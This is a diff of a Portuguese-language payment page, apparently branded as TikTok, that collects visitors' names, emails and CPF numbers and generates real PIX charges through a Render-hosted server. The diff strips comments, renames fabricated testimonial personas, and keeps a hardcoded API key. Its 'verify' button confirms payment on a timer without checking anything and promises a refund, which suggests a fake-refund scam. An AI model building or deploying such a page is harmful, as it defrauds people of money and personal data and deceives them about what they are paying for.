@@ -277,7 +277,7 @@
             color: #666;
         }
         
-        /* Estilos para o QR Code real */
+       
         .real-qr-code {
             width: 200px;
             height: 200px;
@@ -398,7 +398,7 @@
                 
                 <div class="qr-container">
                     <div class="qr-code" id="qrCodeContainer">
-                        <!-- QR Code real será inserido aqui -->
+                       
                     </div>
                 </div>
                 
@@ -519,7 +519,7 @@
                         <div class="testimonial-header">
                             <img src="img/imagem (4).jpg" alt="Maria" class="testimonial-avatar">
                             <div>
-                                <div class="testimonial-name">Maria Santos</div>
+                                <div class="testimonial-name">gabsx_12</div>
                                 <div class="testimonial-role">Criadora de conteúdo</div>
                             </div>
                         </div>
@@ -533,7 +533,7 @@
                         <div class="testimonial-header">
                             <img src="img/imagem (3).jpg" alt="João" class="testimonial-avatar">
                             <div>
-                                <div class="testimonial-name">João Silva</div>
+                                <div class="testimonial-name">Alone</div>
                                 <div class="testimonial-role">Influenciador digital</div>
                             </div>
                         </div>
@@ -547,7 +547,7 @@
                         <div class="testimonial-header">
                             <img src="img/imagem (2).jpg" alt="Ana" class="testimonial-avatar">
                             <div>
-                                <div class="testimonial-name">Ana Oliveira</div>
+                                <div class="testimonial-name">Annsxy.xs</div>
                                 <div class="testimonial-role">Tiktoker</div>
                             </div>
                         </div>
@@ -561,8 +561,8 @@
                         <div class="testimonial-header">
                             <img src="img/imagem (1).jpg" alt="Carlos" class="testimonial-avatar">
                             <div>
-                                <div class="testimonial-name">Carlos Mendes</div>
-                                <div class="testimonial-role">Produtor de vídeos</div>
+                                <div class="testimonial-name">ney_pjl7</div>
+                                <div class="testimonial-role">Editor</div>
                             </div>
                         </div>
                         <div class="testimonial-text">
@@ -599,33 +599,29 @@
     </div>
 
   <script>
-    // ============================================
-    // CONFIGURAÇÃO
-    // ============================================
+    
     const PLUMIFY_API_KEY = "0RRWtMOuHsAQlR7S0zEnlGBnLEnr8DgoDJS3GTecxH7nZr2X01kHo6rxrOGa";
     
-    // ⭐⭐ MUDANÇA: URLs do seu servidor no Render
+    
     const API_BASE_URL = 'https://pagamento-cgzk.onrender.com';
     const CREATE_PIX_URL = API_BASE_URL + '/api/pix/create';
 
     let currentPaymentId = null;
     let timerInterval = null;
 
-    // ============================================
-    // FUNÇÃO PRINCIPAL - AGORA CHAMA API REAL
-    // ============================================
+   
     async function gerarPixReal(event) {
         if (event) event.preventDefault();
         
         console.log('Iniciando PIX REAL...');
         
-        // PEGAR VALORES (COM OS IDs CORRETOS DO HTML)
+       
         const nome = document.getElementById('nome-completo')?.value || '';
         const email = document.getElementById('email-cliente')?.value || '';
         const cpfElement = document.getElementById('cpf-cliente');
         let cpf = cpfElement ? cpfElement.value : '';
         
-        // Limpar CPF (apenas números)
+        
         let cpfLimpo = '';
         for (let i = 0; i < cpf.length; i++) {
             const char = cpf[i];
@@ -636,7 +632,7 @@
         
         console.log('Dados para API:', { nome, email, cpf: cpfLimpo });
         
-        // VALIDAÇÃO
+       
         if (!nome || nome.trim().length < 3) {
             alert('Digite seu nome completo');
             document.getElementById('nome-completo')?.focus();
@@ -657,7 +653,7 @@
         
         console.log('Validação OK! Chamando API...');
         
-        // MOSTRAR LOADING
+        
         document.querySelectorAll('.form-step').forEach(step => {
             step.classList.remove('active');
         });
@@ -665,7 +661,7 @@
         if (loading) loading.classList.add('active');
         
         try {
-            // CHAMAR API REAL NO RENDER
+           
             const response = await fetch(CREATE_PIX_URL, {
                 method: 'POST',
                 headers: {
@@ -686,7 +682,7 @@
             
             console.log('✅ PIX gerado pela API:', data);
             
-            // ATUALIZAR INTERFACE COM DADOS REAIS
+           
             currentPaymentId = data.transaction?.id || 'PIX' + Date.now().toString().slice(-8);
             
             const orderId = document.getElementById('orderId');
@@ -696,12 +692,12 @@
                 pixCodeDisplay.textContent = data.transaction.pix_code;
             }
             
-            // GERAR QR CODE REAL
+            
             const qrContainer = document.getElementById('qrCodeContainer');
             if (qrContainer) {
                 qrContainer.innerHTML = '';
                 
-                // Se tiver URL do QR Code, usar imagem
+               
                 if (data.transaction?.pix_url) {
                     const img = document.createElement('img');
                     img.src = data.transaction.pix_url;
@@ -709,7 +705,7 @@
                     img.className = 'real-qr-code';
                     qrContainer.appendChild(img);
                 } else if (data.transaction?.pix_code) {
-                    // Gerar QR Code localmente com o código
+                    
                     const qrText = data.transaction.pix_code;
                     
                     const canvas = document.createElement('canvas');
@@ -722,35 +718,35 @@
                     
                     const ctx = canvas.getContext('2d');
                     
-                    // Fundo branco
+                    
                     ctx.fillStyle = '#ffffff';
                     ctx.fillRect(0, 0, 200, 200);
                     
-                    // Gerar QR Code simples (padrão de teste)
+                    
                     ctx.fillStyle = '#000000';
                     
-                    // Marcadores de posição (canto superior esquerdo)
+                  
                     ctx.fillRect(15, 15, 35, 35);
                     ctx.fillRect(15, 15, 25, 25);
                     ctx.fillStyle = '#ffffff';
                     ctx.fillRect(20, 20, 25, 25);
                     ctx.fillStyle = '#000000';
                     
-                    // Canto superior direito
+                    
                     ctx.fillRect(150, 15, 35, 35);
                     ctx.fillRect(150, 15, 25, 25);
                     ctx.fillStyle = '#ffffff';
                     ctx.fillRect(155, 20, 25, 25);
                     ctx.fillStyle = '#000000';
                     
-                    // Canto inferior esquerdo
+                  
                     ctx.fillRect(15, 150, 35, 35);
                     ctx.fillRect(15, 150, 25, 25);
                     ctx.fillStyle = '#ffffff';
                     ctx.fillRect(20, 155, 25, 25);
                     ctx.fillStyle = '#000000';
                     
-                    // Padrão de dados simples
+                    
                     for (let i = 0; i < 7; i++) {
                         for (let j = 0; j < 7; j++) {
                             if ((i + j) % 2 === 0) {
@@ -759,7 +755,7 @@
                         }
                     }
                     
-                    // Texto PIX
+                  
                     ctx.fillStyle = '#00F2EA';
                     ctx.font = 'bold 24px Arial';
                     ctx.textAlign = 'center';
@@ -769,27 +765,25 @@
                 }
             }
             
-            // MOSTRAR TELA DO PIX
+           
             mostrarTelaPix();
             
         } catch (error) {
             console.error('❌ Erro na API:', error);
             
-            // MOSTRAR ERRO E VOLTAR
+           
             const loading = document.getElementById('loading');
             const step1 = document.getElementById('step1');
             
             if (loading) loading.classList.remove('active');
             if (step1) step1.classList.add('active');
             
-            // Mostrar modal de erro
+           
             alert('Erro ao gerar PIX: ' + error.message + '\n\nTente novamente em alguns segundos.');
         }
     }
 
-    // ============================================
-    // MOSTRAR TELA DO PIX
-    // ============================================
+   
     function mostrarTelaPix() {
         const loading = document.getElementById('loading');
         const pixStep = document.getElementById('pixPayment');
@@ -803,9 +797,7 @@
         console.log('Página PIX carregada!');
     }
 
-    // ============================================
-    // TIMER
-    // ============================================
+   
     function iniciarTimer(minutos) {
         if (timerInterval) {
             clearInterval(timerInterval);
@@ -844,9 +836,7 @@
         }, 1000);
     }
 
-    // ============================================
-    // FUNÇÃO DE COPIAR
-    // ============================================
+   
     function configurarBotaoCopiar() {
         const copyButton = document.getElementById('copy-button');
         if (copyButton) {
@@ -856,11 +846,11 @@
                     alert('Gere um código PIX primeiro!');
                     return;
                 }
-                const API_BASE_URL = window.location.origin; // Isso pega automaticamente https://pagamento-cgzk.onrender.com
+                const API_BASE_URL = window.location.origin; 
                 const CREATE_PIX_URL = API_BASE_URL + '/api/pix/create';
                 const texto = pixCode.textContent;
                 
-                // Tentar método moderno
+
                 if (navigator.clipboard) {
                     navigator.clipboard.writeText(texto).then(() => {
                         const original = this.innerHTML;
@@ -873,7 +863,7 @@
                         }, 2000);
                     });
                 } else {
-                    // Método fallback
+                   
                     const textarea = document.createElement('textarea');
                     textarea.value = texto;
                     document.body.appendChild(textarea);
@@ -886,9 +876,7 @@
         }
     }
 
-    // ============================================
-    // CONFIGURAR BOTÃO VERIFICAR
-    // ============================================
+    
     function configurarBotaoVerificar() {
         const checkButton = document.getElementById('checkPaymentBtn');
         if (checkButton) {
@@ -904,14 +892,14 @@
                 btn.disabled = true;
                 if (status) status.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verificando...';
                 
-                // Simular verificação (em produção, chamaria API)
+                
                 setTimeout(() => {
                     if (status) {
                         status.innerHTML = '<i class="fas fa-check-circle"></i> Pago com sucesso!';
                         status.className = 'status status-success';
                     }
                     
-                    // Mostrar mensagem de sucesso
+                    
                     setTimeout(() => {
                         alert('✅ Pagamento confirmado!\n\n' +
                               'Seu reembolso de R$ 21,67 será processado em até 1 minuto.\n' +
@@ -924,9 +912,7 @@
         }
     }
 
-    // ============================================
-    // CONFIGURAR BOTÃO NOVO PAGAMENTO
-    // ============================================
+   
     function configurarBotaoNovo() {
         const newButton = document.getElementById('newPaymentBtn');
         if (newButton) {
@@ -945,7 +931,7 @@
                     if (pixStep) pixStep.classList.remove('active');
                     if (step1) step1.classList.add('active');
                     
-                    // Limpar campos
+                   
                     document.getElementById('nome-completo').value = '';
                     document.getElementById('email-cliente').value = '';
                     document.getElementById('cpf-cliente').value = '';
@@ -956,9 +942,7 @@
         }
     }
 
-    // ============================================
-    // MÁSCARA CPF (PARA O ID CORRETO)
-    // ============================================
+    
     function configurarMascaraCPF() {
         const cpfInput = document.getElementById('cpf-cliente');
         if (cpfInput) {
@@ -994,21 +978,17 @@
         }
     }
 
-    // ============================================
-    // CONFIGURAR FORMULÁRIO (COM IDS CORRETOS)
-    // ============================================
+   
     function configurarFormulario() {
         const form = document.getElementById('paymentForm');
         if (form) {
-            // MUDANÇA: Usar a nova função que chama API REAL
+           
             form.addEventListener('submit', gerarPixReal);
             console.log('✅ Formulário configurado com API REAL!');
         }
     }
 
-    // ============================================
-    // CARROSSEL DE DEPOIMENTOS
-    // ============================================
+    
     let currentSlide = 0;
     const totalSlides = 4;
     
@@ -1044,9 +1024,7 @@
     }
     
      
-    // ============================================
-    // INICIALIZAÇÃO QUANDO A PÁGINA CARREGAR
-    // ============================================
+    
     document.addEventListener('DOMContentLoaded', function() {
         console.log('🚀 Inicializando TikTok PIX - VERSÃO COM API REAL');
         console.log('🔗 API URL:', CREATE_PIX_URL);
@@ -1057,7 +1035,7 @@
         configurarBotaoVerificar();
         configurarBotaoNovo();
         
-        // Iniciar carrossel automático
+       
         setInterval(() => {
             moveCarousel(1);
         }, 5000);
@@ -1070,13 +1048,13 @@
         console.log('4. QR Code real será gerado');
     });
 
-    // Fallback caso DOMContentLoaded já tenha acontecido
+   
     if (document.readyState === 'loading') {
         document.addEventListener('DOMContentLoaded', function() {
-            // Já configurado acima
+          
         });
     } else {
-        // DOM já carregado, executar agora
+       
         setTimeout(() => {
             configurarFormulario();
             configurarMascaraCPF();
